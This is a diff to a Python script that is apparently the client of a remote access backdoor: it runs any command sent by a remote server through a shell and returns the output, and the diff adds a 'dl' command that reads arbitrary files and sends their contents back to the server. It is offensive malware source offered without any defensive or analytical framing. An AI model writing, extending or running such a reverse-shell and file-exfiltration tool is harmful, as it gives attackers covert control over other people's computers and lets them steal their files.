@@ -29,23 +29,43 @@ while True:
     command_split = command.split(' ')
     if command_split[0] == "info":
         respond = platform.platform() + " " + os.getcwd()
+        respond = respond.encode()
 
     elif len(command_split) == 2 and command_split[0] == "cd" :
         try:
             os.chdir(command_split[1])
-            respond = "Directory changed"
+            # Did put a proper message to avoid noise in the server's console
+            respond = " "
         except FileNotFoundError:
             respond = "Directory not found"
+        respond = respond.encode()
+
+    elif len(command_split) == 2 and command_split[0] == "dl" :
+        try:
+            f = open(command_split[1], "rb")
+            # respond is already encoded
+            respond = f.read()
+            f.close()
+        except FileNotFoundError:
+            # Did not put a message so that the server not take the error message as the downloaded file
+            respond = " ".encode()
     else:
         result = subprocess.run(command, shell=True, capture_output=True, universal_newlines=True)
-        respond = result.stdout + result.stderr + "got you"
+        respond = result.stdout + result.stderr
+        respond = respond.encode()
 
     # Ensures the server does not block if respond is nothing
     if not respond or len(respond) == 0:
-        respond = "Emty"
-    header = str(len(respond.encode())).zfill(13)
+        respond = " ".encode()
+    data_len = len(respond)
+    header = str(data_len).zfill(13)
     print(header)
     s.sendall(header.encode())
-    s.sendall(respond.encode())
+    if data_len > 0:
+        s.sendall(respond)
 
 s.close()
+
+"""
+I encoded respond in each of the conditions because we handle datatypes as close to the source as possible
+"""
